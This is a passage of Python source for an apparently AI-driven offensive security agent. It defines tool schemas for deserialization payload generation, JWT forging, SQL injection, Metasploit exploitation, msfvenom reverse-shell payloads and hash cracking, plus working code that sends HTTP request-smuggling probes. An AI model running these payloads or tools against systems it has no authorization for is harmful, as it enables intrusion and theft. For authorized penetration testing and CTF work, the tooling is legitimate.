                    "page": {"type": "integer", "description": "Result page (default 1)."},
                    "facets": {"type": "string", "description": "Optional comma-separated facets."},
                },
                "required": ["query"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "censys_host",
            "description": (
                "Look up an IP address in Censys (Hosts API v2) and return services, "
                "autonomous system, and location. Optional alternative to Shodan. "
                "Degrades gracefully when CENSYS_API_ID/CENSYS_API_SECRET are unset."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "ip": {"type": "string", "description": "IP address to look up."},
                },
                "required": ["ip"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "dns_recon",
            "description": (
                "Resolve DNS records for a domain inside the container (uses dnsx if "
                "present, else host/dig). Returns A/AAAA/CNAME/MX/NS/TXT records as "
                "STRUCTURED data. Dependency-light external recon for prod assessments."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "domain": {"type": "string", "description": "Domain to resolve, e.g. example.com."},
                    "record_types": {
                        "type": "string",
                        "description": "Comma-separated record types (default a,aaaa,cname,mx,ns,txt).",
                    },
                    "timeout": {"type": "integer", "description": "Command timeout in seconds (default 60)."},
                },
                "required": ["domain"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "tls_info",
            "description": (
                "Enumerate a host's TLS/SSL configuration (protocols, ciphers, cert) "
                "inside the container using sslscan (fallback testssl.sh). Returns "
                "structured protocol/cipher/certificate findings for prod recon."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "host or host:port (default port 443)."},
                    "timeout": {"type": "integer", "description": "Command timeout in seconds (default 120)."},
                },
                "required": ["target"],
            },
        },
    },
    # =========================================================================
    # Class-specific OSS tools (run in-container via docker exec)
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "jwt_tool",
            "description": (
                "Analyze/tamper/attack a JSON Web Token with jwt_tool inside the "
                "container. Modes: 'scan' (playbook checks incl. alg:none, key "
                "confusion), 'tamper' hints, 'crack' the HMAC secret against a "
                "wordlist, 'exploit' a known attack (e.g. a=alg-none, k=key-"
                "confusion). Returns structured findings under 'kg_records' when a "
                "vulnerability/forged token is produced."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "token": {"type": "string", "description": "The JWT to operate on."},
                    "mode": {
                        "type": "string",
                        "enum": ["scan", "crack", "exploit", "tamper"],
                        "description": "Operation (default scan).",
                    },
                    "exploit": {
                        "type": "string",
                        "description": "jwt_tool -X exploit code for mode=exploit (e.g. a, n, s, k, i).",
                    },
                    "wordlist": {
                        "type": "string",
                        "description": "Container wordlist path for mode=crack (default rockyou.txt).",
                    },
                    "extra_args": {"type": "string", "description": "Extra jwt_tool flags (e.g. '-I -pc name -pv admin')."},
                    "timeout": {"type": "integer", "description": "Command timeout in seconds (default 180)."},
                },
                "required": ["token"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "ysoserial_gen",
            "description": (
                "Generate a Java insecure-deserialization payload with ysoserial "
                "inside the container. Pick a gadget chain (e.g. CommonsCollections6, "
                "URLDNS) and a command; returns the base64 payload ready to inject. "
                "Requires java + ysoserial in the image (payload gen only; no network)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "gadget": {"type": "string", "description": "Gadget chain, e.g. CommonsCollections6, URLDNS."},
                    "command": {"type": "string", "description": "Command/argument for the gadget (e.g. 'curl OOB', 'id')."},
                    "encode": {"type": "boolean", "description": "Base64-encode the raw payload (default true)."},
                    "timeout": {"type": "integer", "description": "Command timeout in seconds (default 120)."},
                },
                "required": ["gadget", "command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "phpggc_gen",
            "description": (
                "Generate a PHP object-injection / deserialization gadget chain with "
                "phpggc inside the container (e.g. Monolog/RCE1, Laravel, Symfony, "
                "Guzzle/FW1). Returns the serialized payload; optionally base64/url "
                "encoded. Payload generation only; no network."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "chain": {"type": "string", "description": "phpggc chain, e.g. Monolog/RCE1."},
                    "command": {"type": "string", "description": "Command/parameters passed to the chain."},
                    "encoding": {
                        "type": "string",
                        "enum": ["none", "base64", "url", "urlencode"],
                        "description": "Output encoding (default none). phpggc -b / -u.",
                    },
                    "extra_args": {"type": "string", "description": "Extra phpggc flags (e.g. '-f', '-p phar')."},
                    "timeout": {"type": "integer", "description": "Command timeout in seconds (default 120)."},
                },
                "required": ["chain", "command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "ssti_probe",
            "description": (
                "Probe a URL for server-side template injection with tplmap "
                "(fallback sstimap) inside the container. Detects the engine and, "
                "when possible, confirms code/command execution. Returns the detected "
                "engine and structured findings under 'kg_records'. Scope-guarded."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL with the injectable parameter."},
                    "data": {"type": "string", "description": "POST body for body parameters (optional)."},
                    "extra_args": {"type": "string", "description": "Extra flags (e.g. '-e jinja2', '--os-cmd id')."},
                    "timeout": {"type": "integer", "description": "Command timeout in seconds (default 300)."},
                },
                "required": ["url"],
            },
        },
    },
    # =========================================================================
    # Automatic tool selection
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "recommend_tools",
            "description": (
                "Return a deterministic, ranked shortlist of the best tools for the "
                "current context (vulnerability class + attack phase + observed "
                "technology), drawn from the expert playbooks and tool catalog. Call "
                "this at the start of a phase or when unsure which tool fits, then "
                "prefer the top recommendation unless you can justify an override. "
                "Each entry has a score and a short justification."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "vuln_class": {
                        "type": "string",
                        "description": (
                            "Vulnerability class or lab type (e.g. 'sqli', 'dom xss', "
                            "'idor', 'request smuggling', 'graphql')."
                        ),
                    },
                    "phase": {
                        "type": "string",
                        "description": "Attack phase: recon | exploit | validate.",
                    },
                    "tech": {
                        "type": "string",
                        "description": (
                            "Observed technology/stack hint(s), e.g. 'AngularJS', "
                            "'nginx', 'PostgreSQL', 'GraphQL'. Comma-separated allowed."
                        ),
                    },
                },
            },
        },
    },
    # =========================================================================
    # Structured scanner wrappers (parsed into records for the KG)
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "ffuf_fuzz",
            "description": (
                "Run ffuf content/parameter fuzzing in the container and return "
                "STRUCTURED results (matched endpoints with status/length), not raw "
                "output. Put FUZZ where you want values injected in the URL. Discovered "
                "endpoints are returned as KG-ready records under 'kg_records'."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target URL containing the FUZZ keyword, e.g. https://target/FUZZ.",
                    },
                    "wordlist": {
                        "type": "string",
                        "description": (
                            "Container path to a wordlist (default "
                            "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt)."
                        ),
                    },
                    "match_codes": {
                        "type": "string",
                        "description": "Comma-separated status codes to keep (default 200,204,301,302,307,401,403).",
                    },
                    "extra_args": {
                        "type": "string",
                        "description": "Optional extra ffuf flags (e.g. '-H \"Host: FUZZ.target\"').",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Command timeout in seconds (default 300).",
                    },
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "sqlmap_run",
            "description": (
                "Run sqlmap non-interactively against a single URL/parameter and return "
                "STRUCTURED results: injectable parameters, back-end DBMS, and finding "
                "records (under 'kg_records'). Use when SQLi is non-trivial/blind or "
                "data extraction is needed; for a simple known lab a single manual "
                "payload via http_request is faster."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target URL, e.g. https://target/item?id=1.",
                    },
                    "data": {
                        "type": "string",
                        "description": "POST body for testing body parameters (optional).",
                    },
                    "extra_args": {
                        "type": "string",
                        "description": (
                            "Optional extra sqlmap flags (e.g. '-p id --technique=BEU', "
                            "'--dbms=postgresql', '--dump -T users'). --batch is always added."
                        ),
                    },
                    "level": {"type": "integer", "description": "sqlmap --level (default 2)."},
                    "risk": {"type": "integer", "description": "sqlmap --risk (default 1)."},
                    "timeout": {"type": "integer", "description": "Command timeout in seconds (default 600)."},
                },
                "required": ["url"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "nmap_scan",
            "description": (
                "Run an nmap service/version scan against a host and return STRUCTURED "
                "results: open ports, services, product/version, plus web endpoints for "
                "any HTTP(S) port (under 'kg_records'). Use for network/host recon when "
                "you have an IP/hostname with unknown services."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "target": {
                        "type": "string",
                        "description": "Host or IP to scan (no scheme), e.g. 10.0.0.5 or target.local.",
                    },
                    "ports": {
                        "type": "string",
                        "description": "Port spec, e.g. '1-1000' or '80,443,8080'. Default: nmap top ports.",
                    },
                    "extra_args": {
                        "type": "string",
                        "description": "Optional extra nmap flags (e.g. '-sC', '-Pn', '--script http-title').",
                    },
                    "timeout": {"type": "integer", "description": "Command timeout in seconds (default 600)."},
                },
                "required": ["target"],
            },
        },
    },
    # =========================================================================
    # Session registration (multi-user IDOR / authz)
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "register_session",
            "description": (
                "Create (or overwrite) a named authenticated session mid-run so multi-"
                "user IDOR/authz labs can hold several identities at once. Supply cookies "
                "(as a dict + domain, or a raw 'a=b; c=d' header) and/or static headers "
                "(e.g. Authorization Bearer). Then use swap_session to switch between "
                "identities; http_request and browser_* honor the active session."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "name": {"type": "string", "description": "Session name, e.g. 'user2', 'admin'."},
                    "role_hint": {
                        "type": "string",
                        "description": "Role label: 'admin' | 'user' | 'unauth' | tenant tag, etc.",
                    },
                    "cookies": {
                        "type": "object",
                        "description": "Cookie name->value map to write into this session's jar.",
                    },
                    "cookie_domain": {
                        "type": "string",
                        "description": "Domain for the cookies dict (e.g. the lab host).",
                    },
                    "cookie_header": {
                        "type": "string",
                        "description": "Raw Cookie header value ('a=b; c=d'); stored as a static header.",
                    },
                    "static_headers": {
                        "type": "object",
                        "description": "Static headers to send, e.g. {\"Authorization\": \"Bearer ...\"}.",
                    },
                    "set_active": {
                        "type": "boolean",
                        "description": "If true, immediately make this the active session (default false).",
                    },
                },
                "required": ["name"],
            },
        },
    },
    # =========================================================================
    # Cross-domain tools — Network / pwn / reversing
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "metasploit_run",
            "description": (
                "Run a Metasploit workflow non-interactively via a generated resource "
                "script (or a raw one you supply) inside the container. Provide a module "
                "plus options (RHOSTS/RPORT/LHOST/PAYLOAD) and it builds and runs the rc. "
                "Returns stdout plus parsed success/session lines under 'kg_records'. "
                "Set the exact vulnerable service/version before choosing a module."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "module": {
                        "type": "string",
                        "description": "Metasploit module path, e.g. exploit/unix/ftp/vsftpd_234_backdoor.",
                    },
                    "options": {
                        "type": "object",
                        "description": "Module options as a map, e.g. {\"RHOSTS\": \"10.0.0.5\", \"RPORT\": 21}.",
                    },
                    "payload": {
                        "type": "string",
                        "description": "Optional PAYLOAD to set, e.g. cmd/unix/reverse.",
                    },
                    "action": {
                        "type": "string",
                        "enum": ["run", "check", "exploit"],
                        "description": "Final action verb for the rc script (default run).",
                    },
                    "resource_script": {
                        "type": "string",
                        "description": "Raw msf rc script; overrides module/options when provided.",
                    },
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 300)."},
                },
                "required": [],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "msfvenom_generate",
            "description": (
                "Generate a payload with msfvenom inside the container and save it to a "
                "file. Use for custom stagers/shellcode when a module needs an external "
                "payload. LHOST/LPORT are your listener (not a scope target)."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "payload": {"type": "string", "description": "Payload, e.g. linux/x64/shell_reverse_tcp."},
                    "lhost": {"type": "string", "description": "Listener host/IP for the payload."},
                    "lport": {"type": "integer", "description": "Listener port (default 4444)."},
                    "format": {"type": "string", "description": "Output format, e.g. elf, exe, python, raw (default elf)."},
                    "out_file": {"type": "string", "description": "Container path to write (default /data/loot/payload.bin)."},
                    "extra_args": {"type": "string", "description": "Extra msfvenom flags, e.g. '-e x86/shikata_ga_nai -i 3'."},
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 120)."},
                },
                "required": ["payload"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "radare2_analyze",
            "description": (
                "Analyze a local binary with radare2 (r2) and return STRUCTURED results: "
                "file info, function count, notable strings, and dangerous-call findings "
                "(gets/strcpy/system/exec, etc.) under 'kg_records'. Use for reversing and "
                "as the first pwn recon step. File-only: no network target."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "binary_path": {"type": "string", "description": "Container path to the binary, e.g. /data/loot/chall."},
                    "commands": {
                        "type": "string",
                        "description": "Optional r2 command string (default 'aaa; iI; afl; izq').",
                    },
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 120)."},
                },
                "required": ["binary_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "gdb_debug",
            "description": (
                "Run gdb in batch mode against a local binary with a list of commands "
                "(e.g. break/run/info registers/x). Good for finding overflow offsets, "
                "leaking values, and inspecting runtime state. File-only: no network target."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "binary_path": {"type": "string", "description": "Container path to the binary."},
                    "commands": {
                        "type": "string",
                        "description": "Newline- or ';'-separated gdb commands, e.g. 'break main\\nrun\\ninfo registers'.",
                    },
                    "args": {"type": "string", "description": "Optional program arguments passed after --args."},
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 120)."},
                },
                "required": ["binary_path", "commands"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "pwn_template",
            "description": (
                "Binary-exploitation helper: runs checksec on the target and generates a "
                "ready-to-edit pwntools exploit skeleton (local + optional remote) saved "
                "under /data/scripts. Returns protections and the script path/content. "
                "If remote_host is set it becomes an in-scope network target."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "binary_path": {"type": "string", "description": "Container path to the target binary."},
                    "remote_host": {"type": "string", "description": "Optional remote host for the pwntools remote() line."},
                    "remote_port": {"type": "integer", "description": "Optional remote port for remote()."},
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 60)."},
                },
                "required": ["binary_path"],
            },
        },
    },
    # =========================================================================
    # Cross-domain tools — Mobile (Android)
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "apk_decompile",
            "description": (
                "Decompile an Android APK with apktool (resources/smali) and/or jadx "
                "(Java source) inside the container. Returns the output directories and a "
                "file summary. File-only: no network target."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "apk_path": {"type": "string", "description": "Container path to the .apk."},
                    "engine": {
                        "type": "string",
                        "enum": ["apktool", "jadx", "both"],
                        "description": "Which decompiler to run (default both).",
                    },
                    "out_dir": {"type": "string", "description": "Output base dir (default /data/loot/<apk-name>)."},
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 300)."},
                },
                "required": ["apk_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "apk_analyze",
            "description": (
                "Static-analyze a decompiled APK source tree: parse the manifest (package, "
                "exported components, permissions) and grep for dangerous sinks and secrets "
                "(WebView JS, exec, crypto, hardcoded keys/URLs). Returns STRUCTURED findings "
                "under 'kg_records'. File-only: no network target."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "source_dir": {"type": "string", "description": "Decompiled tree, e.g. /data/loot/app/jadx."},
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 120)."},
                },
                "required": ["source_dir"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "frida_hook",
            "description": (
                "Run a Frida instrumentation script against a target app on a USB/local "
                "device for a bounded duration and return the captured console output. Use "
                "for root/SSL-pinning bypass or dumping runtime values. Provide either a "
                "script body or a container script path."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "App package name or process name, e.g. com.target.app."},
                    "script": {"type": "string", "description": "Frida JS body OR a container path to a .js file."},
                    "spawn": {"type": "boolean", "description": "Spawn the app (-f) instead of attaching (-n). Default true."},
                    "device": {
                        "type": "string",
                        "enum": ["usb", "local", "remote"],
                        "description": "Device selector: usb (-U), local, or remote (-H). Default usb.",
                    },
                    "duration": {"type": "integer", "description": "Seconds to run before detaching (default 15)."},
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 60)."},
                },
                "required": ["target", "script"],
            },
        },
    },
    # =========================================================================
    # Cross-domain tools — CTF misc (crypto / stego / forensics / flags)
    # =========================================================================
    {
        "type": "function",
        "function": {
            "name": "stego_extract",
            "description": (
                "Extract hidden data from a carrier file using steghide/zsteg/binwalk/"
                "foremost/exiftool/strings. 'auto' layers metadata, embedded-data carving, "
                "and LSB/steghide passphrase attempts, then flag-hunts the output."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "file_path": {"type": "string", "description": "Container path to the carrier file."},
                    "tool": {
                        "type": "string",
                        "enum": ["auto", "steghide", "zsteg", "binwalk", "foremost", "exiftool", "strings"],
                        "description": "Extraction tool (default auto).",
                    },
                    "passphrase": {"type": "string", "description": "Optional steghide passphrase (default empty)."},
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 120)."},
                },
                "required": ["file_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "hash_crack",
            "description": (
                "Crack a hash or password file with john or hashcat using a wordlist "
                "(default rockyou). Provide the hash inline or a container file path. "
                "Returns any cracked plaintext."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "hash_value": {"type": "string", "description": "A single hash string (written to a temp file)."},
                    "hash_file": {"type": "string", "description": "Container path to a file of hashes (overrides hash_value)."},
                    "hash_type": {"type": "string", "description": "john --format or hashcat -m mode (optional; auto if empty)."},
                    "wordlist": {"type": "string", "description": "Wordlist path (default /usr/share/wordlists/rockyou.txt)."},
                    "tool": {
                        "type": "string",
                        "enum": ["john", "hashcat"],
                        "description": "Cracking engine (default john).",
                    },
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 300)."},
                },
                "required": [],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "crypto_helper",
            "description": (
                "Pure-Python crypto/encoding helper (no container). Operations: b64decode, "
                "b64encode, hexdecode, hexencode, rot13, rot (key=N), xor (key=str/hex), "
                "from_binary, to_binary, url_decode, hash_identify. Use to normalize/"
                "transform CTF crypto inputs quickly."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "operation": {
                        "type": "string",
                        "enum": ["b64decode", "b64encode", "hexdecode", "hexencode", "rot13",
                                 "rot", "xor", "from_binary", "to_binary", "url_decode", "hash_identify"],
                        "description": "The transform to apply.",
                    },
                    "data": {"type": "string", "description": "Input string."},
                    "key": {"type": "string", "description": "Key/parameter (xor key, rot amount, etc.)."},
                },
                "required": ["operation", "data"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "forensics_triage",
            "description": (
                "Triage a forensic artifact inside the container. 'auto' fingerprints the "
                "file then runs the right recon; 'pcap' gives capinfos + protocol/HTTP-object "
                "stats via tshark; 'carve' runs binwalk+foremost; 'metadata'/'strings' inspect "
                "the file. Flag-hunts recovered output."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "file_path": {"type": "string", "description": "Container path to the artifact."},
                    "action": {
                        "type": "string",
                        "enum": ["auto", "pcap", "carve", "metadata", "strings"],
                        "description": "Triage mode (default auto).",
                    },
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 180)."},
                },
                "required": ["file_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "flag_hunter",
            "description": (
                "Generic flag post-processor: scan provided text and/or a container file/"
                "directory for flag patterns (default FLAG{...}/CTF{...}/HTB{...} and similar "
                "name{...} forms). Supply a custom regex to match a specific challenge format."
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "text": {"type": "string", "description": "Raw text to scan (e.g. prior tool output)."},
                    "file_path": {"type": "string", "description": "Container file or directory to grep recursively."},
                    "pattern": {"type": "string", "description": "Custom flag regex (default common CTF flag forms)."},
                    "timeout": {"type": "integer", "description": "Command timeout seconds (default 60)."},
                },
                "required": [],
            },
        },
    },
]


# =============================================================================
# Tool Execution Functions
# =============================================================================

def _docker_exec(command: str, timeout: int = DEFAULT_TIMEOUT) -> dict:
    """
    Execute a command inside the Docker container via `docker exec`.
    Returns a dict with stdout, stderr, exit_code, and truncation info.
    """
    full_cmd = [
        "docker", "exec", CONTAINER_NAME,
        "bash", "-c", command
    ]

    try:
        result = subprocess.run(
            full_cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )

        stdout = result.stdout
        stderr = result.stderr
        truncated = False

        # Truncate very long outputs to avoid token overflow
        if len(stdout) > MAX_OUTPUT_LENGTH:
            stdout = stdout[:MAX_OUTPUT_LENGTH] + f"\n\n[TRUNCATED — output was {len(result.stdout)} chars, showing first {MAX_OUTPUT_LENGTH}]"
            truncated = True

        if len(stderr) > MAX_OUTPUT_LENGTH:
            stderr = stderr[:MAX_OUTPUT_LENGTH] + f"\n\n[TRUNCATED — stderr was {len(result.stderr)} chars, showing first {MAX_OUTPUT_LENGTH}]"
            truncated = True

        return {
            "stdout": stdout,
            "stderr": stderr,
            "exit_code": result.returncode,
            "truncated": truncated,
        }

    except subprocess.TimeoutExpired:
        return {
            "stdout": "",
            "stderr": f"Command timed out after {timeout} seconds. Consider increasing timeout or running in background with &.",
            "exit_code": -1,
            "truncated": False,
        }
    except FileNotFoundError:
        return {
            "stdout": "",
            "stderr": "Docker not found. Is Docker installed and the container running?",
            "exit_code": -1,
            "truncated": False,
        }
    except Exception as exc:
        return {
            "stdout": "",
            "stderr": f"Execution error: {str(exc)}",
            "exit_code": -1,
            "truncated": False,
        }


def run_shell(command: str, timeout: int = DEFAULT_TIMEOUT) -> str:
    """Execute a shell command inside the Kali container."""
    result = _docker_exec(command, timeout)
    return json.dumps(result, indent=2)


def _probe_target_from_url(url: str) -> tuple[str, int, bool, str]:
    parsed = urlparse(url if "://" in url else f"https://{url}")
    host = parsed.hostname or ""
    if not host:
        raise ValueError(f"Could not parse host from URL: {url!r}")
    https = parsed.scheme != "http"
    port = parsed.port or (443 if https else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += f"?{parsed.query}"
    return host, port, https, path


def _http1_request(host: str, method: str = "GET", path: str = "/",
                   close: bool = True) -> bytes:
    connection = "close" if close else "keep-alive"
    return (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: Reynard-smuggling-probe\r\n"
        f"Accept: */*\r\n"
        f"Connection: {connection}\r\n"
        "\r\n"
    ).encode("ascii")


def _recv_http1_bytes(sock: socket.socket, timeout: float) -> tuple[bytes, bool, float]:
    """Read until close or timeout. Returns (data, timed_out, elapsed)."""
    started = time.monotonic()
    deadline = started + max(timeout, 0.5)
    chunks: list[bytes] = []
    timed_out = False
    sock.settimeout(0.35)

    while time.monotonic() < deadline:
        try:
            chunk = sock.recv(8192)
        except (socket.timeout, TimeoutError):
            timed_out = True
            continue
        except ssl.SSLError as exc:
            if "timed out" in str(exc).lower():
                timed_out = True
                continue
            break
        if not chunk:
            timed_out = False
            break
        chunks.append(chunk)

    return b"".join(chunks), timed_out, time.monotonic() - started


def _status_codes(text: str) -> list[int]:
    return [
        int(match.group(1))
        for match in re.finditer(r"HTTP/\d(?:\.\d)?\s+(\d{3})", text)
    ]


def _raw_http1_exchange(host: str, port: int, https: bool,
                        sends: list[tuple[bytes, float]],
                        timeout: float) -> dict[str, Any]:
    started = time.monotonic()
    try:
        raw_sock = socket.create_connection((host, port), timeout=max(timeout, 1.0))
        if https:
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(["http/1.1"])
            conn = ctx.wrap_socket(raw_sock, server_hostname=host)
        else:
            conn = raw_sock

        try:
            for data, delay_after in sends:
                conn.sendall(data)
                if delay_after > 0:
                    time.sleep(delay_after)
            raw, read_timed_out, read_elapsed = _recv_http1_bytes(conn, timeout)
        finally:
            try:
                conn.close()
            except Exception:
                pass
    except Exception as exc:
        return {
            "ok": False,
            "error": str(exc),
            "elapsed_seconds": round(time.monotonic() - started, 3),
            "response_count": 0,
            "statuses": [],
            "timed_out": True,
            "raw_excerpt": "",
        }

    text = raw.decode("latin-1", errors="replace")
    statuses = _status_codes(text)
    return {
        "ok": True,
        "elapsed_seconds": round(read_elapsed, 3),
        "response_count": len(statuses),
        "statuses": statuses,
        "timed_out": read_timed_out,
        "raw_excerpt": text[:1600],
    }


def _cl_te_404_request(host: str, smuggled_path: str) -> bytes:
    smuggled_path = smuggled_path if smuggled_path.startswith("/") else f"/{smuggled_path}"
    smuggled = (
        f"GET {smuggled_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "X-Ignore: X"
    ).encode("ascii")
    body = b"0\r\n\r\n" + smuggled
    headers = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).encode("ascii")
    return headers + body


def _cl_te_timeout_request(host: str) -> bytes:
    body = b"1\r\nA"
    headers = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).encode("ascii")
    return headers + body


def _te_cl_prefix_request(host: str) -> bytes:
    body = b"0\r\n\r\nX"
    headers = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    ).encode("ascii")
    return headers + body


def request_smuggling_probe(url: str, vector: str = "auto",
                            smuggled_path: str = "/404",
                            timeout: int = 6) -> str:
    """Run raw HTTP/1.1 request-smuggling probes without client normalization."""
    host, port, https, baseline_path = _probe_target_from_url(url)
    read_timeout = float(max(2, min(timeout or 6, 20)))
    second_get = _http1_request(host, "GET", "/", close=True)

    baseline = _raw_http1_exchange(
        host, port, https,
        [
            (_http1_request(host, "GET", baseline_path, close=False), 0.15),
            (second_get, 0.0),
        ],
        read_timeout,
    )

    requested = [vector] if vector != "auto" else [
        "cl_te_404", "cl_te_timeout", "te_cl_prefix"
    ]
    probes: dict[str, dict[str, Any]] = {}
    if "cl_te_404" in requested:
        probes["cl_te_404"] = _raw_http1_exchange(
            host, port, https,
            [(_cl_te_404_request(host, smuggled_path), 0.25), (second_get, 0.0)],
            read_timeout,
        )
    if "cl_te_timeout" in requested:
        probes["cl_te_timeout"] = _raw_http1_exchange(
            host, port, https,
            [(_cl_te_timeout_request(host), 0.25), (second_get, 0.0)],
            read_timeout,
        )
    if "te_cl_prefix" in requested:
        probes["te_cl_prefix"] = _raw_http1_exchange(
            host, port, https,
            [(_te_cl_prefix_request(host), 0.25), (second_get, 0.0)],
            read_timeout,
        )

    baseline_statuses = baseline.get("statuses", [])
    baseline_has_404 = 404 in baseline_statuses
    clte_404 = probes.get("cl_te_404", {})
    clte_timeout = probes.get("cl_te_timeout", {})
    tecl_prefix = probes.get("te_cl_prefix", {})

    clte_404_signal = bool(
        clte_404.get("ok")
        and not baseline_has_404
        and 404 in clte_404.get("statuses", [])
    )
    clte_timeout_signal = bool(
        clte_timeout.get("ok")
        and not baseline.get("timed_out")
        and clte_timeout.get("timed_out")
        and clte_timeout.get("response_count", 0) < max(2, baseline.get("response_count", 0))
    )
    tecl_signal = bool(
        tecl_prefix.get("ok")
        and not baseline_has_404
        and any(status >= 400 for status in tecl_prefix.get("statuses", []))
    )

    likely = None
    if clte_404_signal or clte_timeout_signal:
        likely = "cl_te"
    elif tecl_signal:
        likely = "te_cl"

    evidence: list[str] = []
    if clte_404_signal:
        evidence.append(
            "CL.TE differential response: baseline did not include 404, "
            "but smuggled GET returned/queued 404 for the subsequent request."
        )
    if clte_timeout_signal:
        evidence.append(
            "CL.TE timeout signal: control exchange completed but crafted "
            "chunked/CL request delayed the following request."
        )
    if tecl_signal:
        evidence.append(
            "TE.CL prefix signal: crafted chunk terminator/prefix changed the "
            "following request into an error response."
        )
    if not evidence:
        evidence.append("No reliable request-smuggling signal observed.")

    return json.dumps({
        "ok": True,
        "url": url,
        "host": host,
        "port": port,
        "https": https,
        "forced_http_version": "HTTP/1.1",
        "vector": vector,
        "smuggled_path": smuggled_path,
        "baseline": baseline,
        "probes": probes,
        "likely_vulnerability": likely,
        "success": bool(likely),
        "evidence_summary": " ".join(evidence),
    }, indent=2)


def tool_inventory(role: str = "general", check_container: bool = False) -> str:
    """Return the curated tool catalog and optional in-container availability."""
    role = (role or "general").lower()
    data: dict[str, Any] = {
        "role": role,
        "container": CONTAINER_NAME,
        "catalog": render_tool_catalog(role),
        "notes": [
            "Prefer direct non-interactive commands over interactive wrappers.",
            "Z4nzu hackingtool is installed at /opt/hackingtool/hackingtool.py, "
            "but direct tools are usually better for automation.",
            "Caido support here is Cloud API only; use it for Caido account, "
            "workspace, team, subscription, and PAT operations, not local proxy history.",
            "For Caido Replay/history/API testing, use caido_local_api and a "
            "local Caido bridge plugin at CAIDO_LOCAL_BRIDGE_URL.",
        ],
    }

    if check_container:
        names = known_command_names()
        quoted_names = " ".join(shlex.quote(name) for name in names)
        cmd = (
            f"for t in {quoted_names}; do "
            "p=$(command -v \"$t\" 2>/dev/null || true); "
            "if [ -n \"$p\" ]; then printf '%s=%s\\n' \"$t\" \"$p\"; "
            "else printf '%s=\\n' \"$t\"; fi; "
            "done; "
            "if [ -f /opt/hackingtool/hackingtool.py ]; then "
